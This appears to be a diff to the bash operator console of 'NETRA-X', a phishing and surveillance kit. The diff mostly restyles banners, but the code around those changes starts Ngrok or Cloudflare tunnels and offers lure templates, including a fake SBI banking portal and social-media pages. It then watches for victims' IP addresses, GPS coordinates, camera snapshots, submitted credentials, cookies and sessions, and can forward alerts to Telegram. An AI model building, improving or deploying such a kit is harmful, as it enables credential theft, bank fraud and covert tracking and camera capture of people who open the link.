@@ -35,70 +35,69 @@ banner() {
 clear
 printf "\n"
 
-# ─── Top Ornamental Border ───────────────────────────────────────────
-printf "\e[1;96m    ════════════════════════════════════════════════════════════════════\e[0m\n"
-printf "\e[1;91m                     ⚔️ नेत्र-X ver-3.0 ⚡  Digital Recon ⚔️\e[0m\n"
-printf "\e[1;96m    ════════════════════════════════════════════════════════════════════\e[0m\n"
-printf "\n"
+# ─── Top System HUD Header ──────────────────────────────────────────
+printf "\e[1;38;5;51m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
+printf "\e[1;38;5;82m  ● SYSTEM: ONLINE \e[1;38;5;51m│ \e[1;38;5;220m⚡ ENGINE: V3.0 PRO \e[1;38;5;51m│ \e[1;38;5;208m🛡️ RECON: ARMED \e[1;38;5;51m│ \e[1;38;5;141m📡 RADAR: ACTIVE\e[0m\n"
+printf "\e[1;38;5;51m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n\n"
 
-# ─── ASCII Art Logo Box ──────────────────────────────────────────────
-printf "\e[1;96m    ╔══════════════════════════════════════════════════════════════════╗\e[0m\n"
-printf "\e[1;96m    ║                                                                  ║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m███╗   ██╗\e[0m\e[1;37m ███████╗\e[0m\e[1;92m ████████╗\e[0m\e[1;37m ██████╗ \e[0m\e[1;92m  █████╗\e[0m\e[1;93m        \e[0m\e[1;91m ██╗    ██╗\e[0m\e[1;96m║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m████╗  ██║\e[0m\e[1;37m ██╔════╝\e[0m\e[1;92m ╚══██╔══╝\e[0m\e[1;37m ██╔══██╗\e[0m\e[1;92m ██╔══██╗\e[0m\e[1;93m        \e[0m\e[1;91m ╚██╗██╔╝\e[0m\e[1;96m ║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m██╔██╗ ██║\e[0m\e[1;37m █████╗  \e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██████╔╝\e[0m\e[1;92m ███████║\e[0m\e[1;93m ██████ \e[0m\e[1;91m  ╚███╔╝ \e[0m\e[1;96m ║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m██║╚██╗██║\e[0m\e[1;37m ██╔══╝  \e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██╔══██╗\e[0m\e[1;92m ██╔══██║\e[0m\e[1;93m        \e[0m\e[1;91m  ██╔██╗ \e[0m\e[1;96m ║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m██║ ╚████║\e[0m\e[1;37m ███████╗\e[0m\e[1;92m    ██║   \e[0m\e[1;37m ██║  ██║\e[0m\e[1;92m ██║  ██║\e[0m\e[1;93m       \e[0m\e[1;91m ██╔╝   ██╗\e[0m\e[1;96m║\e[0m\n"
-printf "\e[1;96m    ║ \e[1;92m╚═╝  ╚═══╝\e[0m\e[1;37m ╚══════╝\e[0m\e[1;92m    ╚═╝   \e[0m\e[1;37m ╚═╝  ╚═╝\e[0m\e[1;92m ╚═╝  ╚═╝\e[0m\e[1;93m       \e[0m\e[1;91m ╚═╝    ╚═╝\e[0m\e[1;96m║\e[0m\n"
-printf "\e[1;96m    ║                                                                  ║\e[0m\n"
-printf "\e[1;96m    ╚══════════════════════════════════════════════════════════════════╝\e[0m\n"
+# ─── Top Title ───────────────────────────────────────────────────────
+printf "\e[1;38;5;196m                     ⚔️ नेत्र-X ver-3.0 ⚡  Digital Recon ⚔️\e[0m\n"
+printf "\e[1;38;5;51m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n\n"
+
+# ─── ASCII Art Logo ──────────────────────────────────────────────────
+printf "\e[1;38;5;82m   ███╗   ██╗\e[1;38;5;255m ███████╗\e[1;38;5;82m ████████╗\e[1;38;5;255m ██████╗ \e[1;38;5;82m  █████╗\e[1;38;5;220m        \e[1;38;5;196m ██╗    ██╗\e[0m\n"
+printf "\e[1;38;5;82m   ████╗  ██║\e[1;38;5;255m ██╔════╝\e[1;38;5;82m ╚══██╔══╝\e[1;38;5;255m ██╔══██╗\e[1;38;5;82m ██╔══██╗\e[1;38;5;220m        \e[1;38;5;196m ╚██╗██╔╝\e[0m\n"
+printf "\e[1;38;5;82m   ██╔██╗ ██║\e[1;38;5;255m █████╗  \e[1;38;5;82m    ██║   \e[1;38;5;255m ██████╔╝\e[1;38;5;82m ███████║\e[1;38;5;220m ██████ \e[1;38;5;196m  ╚███╔╝ \e[0m\n"
+printf "\e[1;38;5;82m   ██║╚██╗██║\e[1;38;5;255m ██╔══╝  \e[1;38;5;82m    ██║   \e[1;38;5;255m ██╔══██╗\e[1;38;5;82m ██╔══██║\e[1;38;5;220m        \e[1;38;5;196m  ██╔██╗ \e[0m\n"
+printf "\e[1;38;5;82m   ██║ ╚████║\e[1;38;5;255m ███████╗\e[1;38;5;82m    ██║   \e[1;38;5;255m ██║  ██║\e[1;38;5;82m ██║  ██║\e[1;38;5;220m       \e[1;38;5;196m ██╔╝   ██╗\e[0m\n"
+printf "\e[1;38;5;82m   ╚═╝  ╚═══╝\e[1;38;5;255m ╚══════╝\e[1;38;5;82m    ╚═╝   \e[1;38;5;255m ╚═╝  ╚═╝\e[1;38;5;82m ╚═╝  ╚═╝\e[1;38;5;220m       \e[1;38;5;196m ╚═╝    ╚═╝\e[0m\n\n"
 
 # ─── Tagline Bar ─────────────────────────────────────────────────────
-printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"
-printf "\e[1;96m            ⚡ 👁️  NETRA-X ver-3.0  ━  The All-Seeing Eye  👁️ ⚡\e[0m\n"
-printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"
+printf "\e[1;38;5;220m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
+printf "\e[1;38;5;51m             ⚡ 👁️  NETRA-X ver-3.0  ━  The All-Seeing Eye  👁️ ⚡\e[0m\n"
+printf "\e[1;38;5;220m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
 
 # ─── Mahabharata Vision Section ──────────────────────────────────────
 printf "\n"
-printf "\e[1;91m    ◆━━━━━━━━━━━━━━ ⚡ Divya Drishti (Divine Vision) ⚡ ━━━━━━━━━━━━━━◆\e[0m\n"
+printf "\e[1;38;5;196m    ◆━━━━━━━━━━━━━━ ⚡ Divya Drishti (Divine Vision) ⚡ ━━━━━━━━━━━━━━◆\e[0m\n"
 printf "\n"
 
 # ── Shloka 1 : The Gift of Divine Eyes --Bhagavad Gita 11.8 (Mahabharata) ──
-printf "\e[1;93m     न तु मां शक्यसे द्रष्टुमनेनैव स्वचक्षुषा ।\e[0m\n"
-printf "\e[1;93m     दिव्यं ददामि ते चक्षुः पश्य मे योगमैश्वरम् ॥\e[0m\n"
-printf "\e[1;37m     \"But you cannot see Me with your present eyes.\e[0m\n"
-printf "\e[1;37m      Therefore I give you divine eyes (Netra).\e[0m\n"
-printf "\e[1;37m      Behold My mystic opulence!\"\e[0m\n"
-printf "\e[0;90m                                  --Bhagavad Gita 11.8 (Mahabharata)\e[0m\n"
+printf "\e[1;38;5;220m     न तु मां शक्यसे द्रष्टुमनेनैव स्वचक्षुषा ।\e[0m\n"
+printf "\e[1;38;5;220m     दिव्यं ददामि ते चक्षुः पश्य मे योगमैश्वरम् ॥\e[0m\n"
+printf "\e[1;38;5;255m     \"But you cannot see Me with your present eyes.\e[0m\n"
+printf "\e[1;38;5;255m      Therefore I give you divine eyes (Netra).\e[0m\n"
+printf "\e[1;38;5;255m      Behold My mystic opulence!\"\e[0m\n"
+printf "\e[38;5;242m                                  --Bhagavad Gita 11.8 (Mahabharata)\e[0m\n"
 printf "\n"
 
 # ── Shloka 2 : The Cosmic Promise --Bhagavad Gita 4.7 (Mahabharata) ────────
-printf "\e[1;93m     यदा यदा हि धर्मस्य ग्लानिर्भवति भारत ।\e[0m\n"
-printf "\e[1;93m     अभ्युत्थानमधर्मस्य तदात्मानं सृजाम्यहम् ॥\e[0m\n"
-printf "\e[1;37m     \"Whenever and wherever there is a decline in righteousness,\e[0m\n"
-printf "\e[1;37m      and a predominant rise of unrighteousness,\e[0m\n"
-printf "\e[1;37m      at that time I descend Myself.\"\e[0m\n"
-printf "\e[0;90m                                  --Bhagavad Gita 4.7 (Mahabharata)\e[0m\n"
+printf "\e[1;38;5;220m     यदा यदा हि धर्मस्य ग्लानिर्भवति भारत ।\e[0m\n"
+printf "\e[1;38;5;220m     अभ्युत्थानमधर्मस्य तदात्मानं सृजाम्यहम् ॥\e[0m\n"
+printf "\e[1;38;5;255m     \"Whenever and wherever there is a decline in righteousness,\e[0m\n"
+printf "\e[1;38;5;255m      and a predominant rise of unrighteousness,\e[0m\n"
+printf "\e[1;38;5;255m      at that time I descend Myself.\"\e[0m\n"
+printf "\e[38;5;242m                                  --Bhagavad Gita 4.7 (Mahabharata)\e[0m\n"
 printf "\n"
 
 # ── Shloka 3 : The Ultimate Victory --Bhagavad Gita 18.78 (Mahabharata) ────
-printf "\e[1;93m     यत्र योगेश्वरः कृष्णो यत्र पार्थो धनुर्धरः ।\e[0m\n"
-printf "\e[1;93m     तत्र श्रीर्विजयो भूतिर्ध्रुवा नीतिर्मतिर्मम ॥\e[0m\n"
-printf "\e[1;37m     \"Wherever there is the master of all mystics,\e[0m\n"
-printf "\e[1;37m      and the supreme archer, there will be certain\e[0m\n"
-printf "\e[1;37m      victory, extraordinary power, and morality.\"\e[0m\n"
-printf "\e[0;90m                                  --Bhagavad Gita 18.78 (Mahabharata)\e[0m\n"
+printf "\e[1;38;5;220m     यत्र योगेश्वरः कृष्णो यत्र पार्थो धनुर्धरः ।\e[0m\n"
+printf "\e[1;38;5;220m     तत्र श्रीर्विजयो भूतिर्ध्रुवा नीतिर्मतिर्मम ॥\e[0m\n"
+printf "\e[1;38;5;255m     \"Wherever there is the master of all mystics,\e[0m\n"
+printf "\e[1;38;5;255m      and the supreme archer, there will be certain\e[0m\n"
+printf "\e[1;38;5;255m      victory, extraordinary power, and morality.\"\e[0m\n"
+printf "\e[38;5;242m                                  --Bhagavad Gita 18.78 (Mahabharata)\e[0m\n"
 printf "\n"
 
-printf "\e[1;91m    ◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\e[0m\n"
+printf "\e[1;38;5;196m    ◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆\e[0m\n"
 
 # ─── Professional Footer ─────────────────────────────────────────────
 printf "\n"
-printf "\e[1;96m     🛡️  Project  :\e[0m \e[1;97mNETRA-X ver-3.0\e[0m\n"
-printf "\e[1;96m     🔗  GitHub   :\e[0m \e[1;92mgithub.com/Garuda-Netra\e[0m\n"
-printf "\e[1;96m     ⚔️  Creator  :\e[0m \e[1;97mRaj Kumar\e[0m\n"
+printf "\e[1;38;5;51m     🛡️  Project  :\e[0m \e[1;38;5;255mNETRA-X ver-3.0 PRO\e[0m\n"
+printf "\e[1;38;5;51m     🔗  GitHub   :\e[0m \e[1;38;5;82mgithub.com/Garuda-Netra\e[0m\n"
+printf "\e[1;38;5;51m     ⚔️  Creator  :\e[0m \e[1;38;5;255mRaj Kumar\e[0m\n"
 printf "\n"
-printf "\e[1;93m    ════════════════════════════════════════════════════════════════════\e[0m\n"
+printf "\e[1;38;5;220m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
 printf "\n"
 }
 
@@ -252,20 +251,26 @@ install_php_extension() {
 }
 
 dependencies() {
+  printf "\e[1;38;5;51m┌── [ ⚡ SYSTEM ENVIRONMENT & DEPENDENCIES ] ────────────────────────────────\e[0m\n"
+  
   # ── 1. Check & auto-install PHP binary ────────────────────────────────
   if ! command -v php > /dev/null 2>&1; then
     install_php_package
   fi
+  printf "\e[1;38;5;51m│\e[0m  \e[1;38;5;82m[✓]\e[0m \e[1;38;5;255mPHP Engine Runtime\e[0m ........................................ \e[1;38;5;82m[ONLINE]\e[0m\n"
 
   # ── 2. Check & auto-install required PHP extensions ────────────────────
   for ext in curl json mbstring openssl; do
     install_php_extension "$ext"
   done
+  printf "\e[1;38;5;51m│\e[0m  \e[1;38;5;82m[✓]\e[0m \e[1;38;5;255mPHP Subsystems (curl, json, mbstring, openssl)\e[0m ......... \e[1;38;5;82m[LOADED]\e[0m\n"
 
   # ── 3. Check & auto-install unzip ──────────────────────────────────────
   if ! command -v unzip > /dev/null 2>&1; then
     install_unzip_package
   fi
+  printf "\e[1;38;5;51m│\e[0m  \e[1;38;5;82m[✓]\e[0m \e[1;38;5;255mArchive Decompression (unzip)\e[0m ......................... \e[1;38;5;82m[ACTIVE]\e[0m\n"
+  printf "\e[1;38;5;51m└── [ 🛡️ ALL CORE SUBSYSTEMS ARMED & READY ] ───────────────────────────────\e[0m\n\n"
 }
 
 stop() {
@@ -395,16 +400,20 @@ if [[ ! -d "data/saved_locations" ]]; then
   mkdir -p data/saved_locations
 fi
 
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+printf "\e[1;38;5;51m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
+printf "\e[1;38;5;220m  🛰️  NETRA-X RADAR HUD  ━  LISTENING FOR INCOMING TARGET SIGNALS...\e[0m\n"
+printf "\e[1;38;5;82m  📡  STATUS: [● ARMED & SCANNING]  \e[1;38;5;51m│  \e[1;38;5;208m📍 GPS TRACKER: [● ACTIVE]\e[0m\n"
+printf "\e[38;5;242m  ⌨️   Press Ctrl + C anytime to terminate session and cleanup.\e[0m\n"
+printf "\e[1;38;5;51m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n\n"
+
 while true; do
 
   # ── New IP hit ──
   if [[ -e "data/.flag_ip" ]]; then
     rm -f "data/.flag_ip"
-    printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\e[0m\n"
+    printf "\a\n\e[1;38;5;51m╔═ [ 🎯 TARGET SIGNAL DETECTED ] ════════════════════════════════════════════╗\e[0m\n"
     catch_ip
+    printf "\e[1;38;5;51m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   sleep 0.5
@@ -413,76 +422,83 @@ while true; do
   if [[ -e "data/.flag_location_error" ]]; then
     loc_error=$(cat "data/.flag_location_error" 2>/dev/null)
     rm -f "data/.flag_location_error"
-    printf "\n\e[1;91m[!] Geolocation failed: %s\e[0m\n" "$loc_error"
+    printf "\n\e[1;38;5;208m[!] Geolocation Notice: %s\e[0m\n" "$loc_error"
   fi
 
   # ── New location ──
   if [[ -e "data/.flag_location" ]]; then
     loc_basename=$(cat "data/.flag_location" 2>/dev/null)
     rm -f "data/.flag_location"
-    printf "\n\e[1;92m[\e[0m+\e[1;92m] Location data received!\e[0m\n"
+    printf "\a\n\e[1;38;5;82m╔═ [ 📍 PRECISE GPS COORDINATES CAPTURED ] ══════════════════════════════════╗\e[0m\n"
     catch_location "data/${loc_basename}"
+    printf "\e[1;38;5;82m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── New camera capture ──
   if [[ -e "data/.flag_cam" ]]; then
     cam_path=$(cat "data/.flag_cam" 2>/dev/null)
     rm -f "data/.flag_cam"
-    printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera capture received!\e[0m\n"
+    printf "\a\n\e[1;38;5;141m╔═ [ 📷 CAMERA SNAPSHOT INTERCEPTED ] ═══════════════════════════════════════╗\e[0m\n"
     if [[ -n "$cam_path" ]]; then
-      printf "\e[1;93m[\e[0m+\e[1;93m] Saved: %s\e[0m\n" "$cam_path"
+      printf "\e[1;38;5;220m[+] File Saved: %s\e[0m\n" "$cam_path"
     fi
+    printf "\e[1;38;5;141m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── New form submission ──
   if [[ -e "data/.flag_form" ]]; then
     form_data=$(cat "data/.flag_form" 2>/dev/null)
     rm -f "data/.flag_form"
-    printf "\n\e[1;92m[\e[0m+\e[1;92m] Form submission received!\e[0m\n"
-    printf "\e[1;93m%s\e[0m\n" "$form_data"
+    printf "\a\n\e[1;38;5;196m╔═ [ 🔐 CREDENTIALS & FORM DATA CAPTURED ] ═════════════════════════════════╗\e[0m\n"
+    printf "\e[1;38;5;220m%s\e[0m\n" "$form_data"
+    printf "\e[1;38;5;196m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── New visitor detection (userInfo.php) ──
   if [[ -e "data/.flag_visitor" ]]; then
     visitor_data=$(cat "data/.flag_visitor" 2>/dev/null)
     rm -f "data/.flag_visitor"
-    printf "\n\e[1;96m%s\e[0m\n" "$visitor_data"
+    printf "\a\n\e[1;38;5;51m%s\e[0m\n" "$visitor_data"
   fi
 
   # ── Link Share / Preview detection (WhatsApp, Telegram, SMS, Discord, etc.) ──
   if [[ -e "data/.flag_share" ]]; then
     share_data=$(cat "data/.flag_share" 2>/dev/null)
     rm -f "data/.flag_share"
-    printf "\n\e[1;92m%s\e[0m\n" "$share_data"
-    printf "\e[1;93m[\e[0m*\e[1;93m] Saved: data/share_logs.txt  |  data/share_logs.jsonl\e[0m\n"
+    printf "\a\n\e[1;38;5;141m╔═ [ 🔗 LINK PREVIEW / SHARE EVENT DETECTED ] ═══════════════════════════════╗\e[0m\n"
+    printf "\e[1;38;5;255m%s\e[0m\n" "$share_data"
+    printf "\e[1;38;5;82m[✓] Logged: data/share_logs.txt | data/share_logs.jsonl\e[0m\n"
+    printf "\e[1;38;5;141m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── Tor exit node alert ──
   if [[ -e "data/.flag_tor" ]]; then
     tor_data=$(cat "data/.flag_tor" 2>/dev/null)
     rm -f "data/.flag_tor"
-    printf "\n\e[1;91m[!] TOR BROWSER DETECTED --connection is anonymized!\e[0m\n"
-    printf "\e[1;91m[!] WebRTC leaks are BLOCKED by Tor Browser.\e[0m\n"
-    printf "\e[1;91m[!] Real IP cannot be retrieved via WebRTC on this visit.\e[0m\n"
-    printf "\e[1;93m%s\e[0m\n" "$tor_data"
+    printf "\n\e[1;38;5;196m╔═ [ ⚠️ TOR NETWORK EXIT NODE DETECTED ] ════════════════════════════════════╗\e[0m\n"
+    printf "\e[1;38;5;208m[!] Connection is routed via Anonymized Tor Network.\e[0m\n"
+    printf "\e[1;38;5;220m%s\e[0m\n" "$tor_data"
+    printf "\e[1;38;5;196m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── WebRTC internal IP / VPN detection ──
   if [[ -e "data/.flag_webrtc" ]]; then
     webrtc_data=$(cat "data/.flag_webrtc" 2>/dev/null)
     rm -f "data/.flag_webrtc"
-    printf "\n\e[1;95m[\e[0m+\e[1;95m] WebRTC Internal IP captured!\e[0m\n"
-    printf "\e[1;93m%s\e[0m\n" "$webrtc_data"
-    printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/webrtc_ips.txt  |  data/webrtc_ips.jsonl\e[0m\n"
+    printf "\a\n\e[1;38;5;141m╔═ [ 🌐 WEBRTC INTERNAL IP & LAN PROBE ] ═══════════════════════════════════╗\e[0m\n"
+    printf "\e[1;38;5;220m%s\e[0m\n" "$webrtc_data"
+    printf "\e[1;38;5;82m[✓] Logged: data/webrtc_ips.txt | data/webrtc_ips.jsonl\e[0m\n"
+    printf "\e[1;38;5;141m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   # ── New cookie / session / device telemetry capture ──
   if [[ -e "data/.flag_cookies" ]]; then
     cookie_data=$(cat "data/.flag_cookies" 2>/dev/null)
     rm -f "data/.flag_cookies"
-    printf "\n\e[1;93m[\e[0m+\e[1;93m] ⚡ Device Telemetry & Session Data Captured!\e[0m\n"
-    printf "\e[1;96m%s\e[0m\n" "$cookie_data"
-    printf "\e[1;92m[\e[0m*\e[1;92m] Saved: data/cookies_sessions.txt  |  data/cookies_sessions.jsonl\e[0m\n"
+    printf "\a\n\e[1;38;5;220m╔═ [ ⚡ ADVANCED DEVICE TELEMETRY & SESSIONS ] ══════════════════════════════╗\e[0m\n"
+    printf "\e[1;38;5;51m%s\e[0m\n" "$cookie_data"
+    printf "\e[1;38;5;82m[✓] Logged: data/cookies_sessions.txt | data/cookies_sessions.jsonl\e[0m\n"
+    printf "\e[1;38;5;220m╚══════════════════════════════════════════════════════════════════════════════╝\e[0m\n"
   fi
 
   sleep 0.5
@@ -830,12 +846,16 @@ cloudflare_tunnel() {
   done
 
   if [[ "$tunnel_healthy" == true ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Tunnel is online and ready for traffic.\e[0m\n"
+    printf "\e[1;38;5;82m[✓] CloudFlare Edge Routing: [ESTABLISHED & HEALTHY]\e[0m\n"
   else
-    printf "\e[1;93m[\e[0m!\e[1;93m] Tunnel link generated. If not immediately reachable, allow 5–10 seconds for global DNS propagation.\e[0m\n"
+    printf "\e[1;38;5;208m[!] CloudFlare Tunnel Link Generated --Edge propagating globally...\e[0m\n"
   fi
 
-  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  printf "\n\e[1;38;5;82m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
+  printf "\e[1;38;5;82m  🔗 PUBLIC ACCESS URL  :\e[0m \e[1;38;5;51m%s\e[0m\n" "$link"
+  printf "\e[1;38;5;82m  ⚡ LOCAL ORIGIN HOST  :\e[0m \e[1;38;5;220mhttp://127.0.0.1:3333\e[0m\n"
+  printf "\e[1;38;5;82m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n\n"
+
   check_telegram_status
   build_payload "$link"
   checkfound
@@ -850,9 +870,9 @@ check_telegram_status() {
   fi
 
   if [[ -n "$token" && -n "$chat_id" ]]; then
-    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram Bot Alerts: \e[1;92mACTIVE\e[0m \e[1;90m(Chat: %s)\e[0m\n" "$chat_id"
+    printf "\e[1;38;5;82m[✓] Telegram Alerts Subsystem: [ONLINE & CONNECTED]\e[0m \e[38;5;242m(Chat ID: %s)\e[0m\n" "$chat_id"
   else
-    printf "\e[1;93m[\e[0m!\e[1;93m] Telegram Bot Alerts: \e[1;93mNOT CONFIGURED\e[0m \e[1;90m(Edit .env to receive real-time alerts)\e[0m\n"
+    printf "\e[1;38;5;208m[!] Telegram Alerts Subsystem: [NOT CONFIGURED]\e[0m \e[38;5;242m(Edit .env for real-time notifications)\e[0m\n"
   fi
 }
 
@@ -1144,18 +1164,24 @@ fi
     exit 1
   fi
 
-  printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  printf "\n\e[1;38;5;82m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n"
+  printf "\e[1;38;5;82m  🔗 PUBLIC ACCESS URL  :\e[0m \e[1;38;5;51m%s\e[0m\n" "$link"
+  printf "\e[1;38;5;82m  ⚡ LOCAL ORIGIN HOST  :\e[0m \e[1;38;5;220mhttp://127.0.0.1:3333\e[0m\n"
+  printf "\e[1;38;5;82m━◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆━\e[0m\n\n"
   check_telegram_status
   build_payload "$link"
   checkfound
 }
 
 netraX-3.0() {
-printf "\e[1;95m----- Choose tunnel server -----\e[0m\n"
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m CloudFlare Tunnel\e[0m\n"
+printf "\e[1;38;5;51m┌── [ 🛰️  SELECT PORT FORWARDING ENGINE ] ──────────────────────────────┐\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[01]\e[0m \e[1;38;5;220m⚡ Ngrok Secure Tunnel\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[02]\e[0m \e[1;38;5;51m🌐 CloudFlare Quick Tunnel\e[0m  \e[38;5;242m(Instant HTTPS, no token required)\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m\n"
+printf "\e[1;38;5;51m└───────────────────────────────────────────────────────────────────────┘\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mChoose Forwarding option [Default: 1]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 
@@ -1164,7 +1190,7 @@ cloudflare_tunnel
 elif [[ $option_server -eq 1 ]]; then
 ngrok_server
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;38;5;196m [!] Invalid option! Retrying...\e[0m\n"
 sleep 1
 clear
 netraX-3.0
@@ -1173,24 +1199,21 @@ fi
 
 select_template() {
 if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
-printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
+printf "\e[1;38;5;196m [!] Invalid tunnel option! Try again.\e[0m\n"
 sleep 1
 clear
 banner
 netraX-3.0
 else
-printf "\n\e[1;95m----- Choose a template -----\e[0m\n"   
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Season’s Greetings\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m YouTube Streaming\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Conference\e[0m\n"
-# Template 4 --Social Media Reporting (self-contained PHP module)
-printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Social Media Reporting\e[0m\n"
-# Template 5 --Banking Portal (SBI YONO Net Banking)
-printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Banking Portal\e[0m\n"
-  # Template 6 --Social Media (Snapchat, etc.)
-  printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m Social Media\e[0m\n"
+printf "\n\e[1;38;5;51m┌── [ 🎯  SELECT DIGITAL RECON TARGET MODULE ] ─────────────────────────┐\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[01]\e[0m \e[1;38;5;220m🎁 Season’s Greetings\e[0m       \e[1;38;5;82m[04]\e[0m \e[1;38;5;196m🚨 Social Media Reporting\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[02]\e[0m \e[1;38;5;208m🎬 YouTube Live Stream\e[0m      \e[1;38;5;82m[05]\e[0m \e[1;38;5;82m🏦 Banking Portal (SBI)\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m   \e[1;38;5;82m[03]\e[0m \e[1;38;5;141m📹 Online Conference\e[0m        \e[1;38;5;82m[06]\e[0m \e[1;38;5;220m👻 Social Media Portal\e[0m\n"
+printf "\e[1;38;5;51m│\e[0m\n"
+printf "\e[1;38;5;51m└───────────────────────────────────────────────────────────────────────┘\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mChoose a template [Default: 1]: \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 
 # ── Persist selected template index so the PHP logger can read it ──────
@@ -1198,19 +1221,17 @@ mkdir -p data
 printf '%s' "$option_tem" > data/.active_template
 
 if [[ $option_tem -eq 1 ]]; then
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
+read -p $'\n\e[1;38;5;51m[⚡ NetraX] ❯ \e[1;38;5;255mEnter festival name: \e[0m' fest_name
 fest_name="${fest_name:-NETRA-X Celebration}"
 fest_name="${fest_name#"${fest_name%%[![:space:]]*}"}"
 fest_name="${fest_name%"${fest_name##*[![:space:]]}"}"
